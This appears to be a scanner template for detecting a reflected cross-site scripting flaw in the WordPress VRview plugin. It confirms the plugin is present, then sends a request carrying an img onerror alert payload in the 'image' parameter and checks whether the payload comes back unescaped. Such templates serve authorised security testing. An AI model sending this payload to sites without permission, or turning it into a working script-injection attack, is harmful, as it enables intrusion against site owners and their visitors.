id: vrview-xss
brief:
    title: VRview Plugin - Cross-Site Scripting
    by: ritikchaddha
    level: high
    about: The VRview plugin is a tool commonly used to embed and display 360-degree virtual reality content in web applications. However, improper input sanitization in the plugin allows attackers to inject ...
    label:
        - wp
        - wp-plugin
        - wordpress
        - vrview
        - xss
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/'
      signs:
        - "on": word
          has:
            - /wp-content/plugins/vrview
          in: body
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)>'
      signs:
        - "on": word
          has:
            - <img src=x onerror=alert(document.domain)>
          in: body
        - "on": word
          has:
            - text/html
          in: content_type
        - "on": status
          status:
            - 200
